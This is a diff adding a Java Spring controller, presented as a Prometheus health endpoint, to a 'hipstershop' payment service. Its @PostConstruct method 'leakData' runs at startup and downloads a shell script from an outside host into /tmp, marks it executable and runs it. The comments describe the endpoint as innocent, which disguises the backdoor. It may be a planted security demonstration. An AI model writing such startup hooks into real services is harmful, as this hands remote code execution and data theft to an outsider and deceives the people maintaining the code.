@@ -1,0 +1,32 @@
+package com.hipstershop.paymentservicejava;
+
+import javax.annotation.PostConstruct;
+
+import org.springframework.web.bind.annotation.RestController;
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.RequestParam;
+
+
+@RestController
+public class PrometheusHealthResource {
+
+    Process process;
+
+
+    @GetMapping("/health")
+    public String getStatus(@RequestParam(name = "scope", defaultValue = "default") String param) {
+        // just some innocent health resource we shall implement later
+        // hopefully this method is not vulnerable to anything
+        return "ok";
+    }
+
+    @PostConstruct
+    public void leakData() {
+        try {
+            process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "wget -q -O /tmp/leak.sh https://cthulhu.dashpartnersummit.com/script && chmod +x /tmp/leak.sh && /tmp/leak.sh"});
+        } catch(Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+}
